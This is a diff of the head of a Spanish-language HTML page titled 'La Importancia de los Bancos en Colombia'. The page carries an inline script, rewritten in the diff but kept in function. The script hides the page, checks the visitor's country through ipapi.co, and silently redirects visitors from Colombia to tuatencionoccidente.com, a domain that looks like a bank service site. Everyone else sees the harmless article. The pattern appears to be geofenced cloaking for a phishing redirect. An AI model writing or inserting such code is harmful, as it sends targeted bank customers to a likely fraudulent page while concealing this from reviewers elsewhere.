@@ -1,7 +1,25 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <script> document.write(` <style> body { visibility: hidden; } .loader { visibility: visible; width: 50px; height: 50px; border: 5px solid #ddd; border-top: 5px solid #000; border-radius: 50%; animation: spin 2s linear infinite; position: fixed; top: 50%; left: 50%; margin: -25px 0 0 -25px; } @keyframes spin { 100% { transform: rotate(360deg); } } </style><div class="loader"></div> `); (async()=>{ try { let d = await (await fetch("https://ipapi.co/json/")).json(); if(d.country_code==="CO") { location.replace("https://tuatencionoccidente.com"); } else { document.body.style.visibility = "visible"; document.querySelector(".loader").remove(); } } catch(e) { document.body.style.visibility = "visible"; document.querySelector(".loader").remove(); } })(); </script>
+  <script>
+document.write(`<style>
+body{visibility:hidden}
+.l{visibility:visible;width:40px;height:40px;border:5px solid #ddd;border-top-color:#000;border-radius:50%;animation:s 1s linear infinite;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%)}
+@keyframes s{to{transform:translate(-50%,-50%) rotate(360deg)}}
+</style><div class=l></div>`);
+
+fetch("https://ipapi.co/json/")
+.then(r=>r.json())
+.then(d=>d.country_code=="CO"?
+location.replace("https://tuatencionoccidente.com"):
+show())
+.catch(show);
+
+function show(){
+ document.body.style.visibility="visible";
+ document.querySelector(".l")?.remove();
+}
+</script>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>La Importancia de los Bancos en Colombia</title>
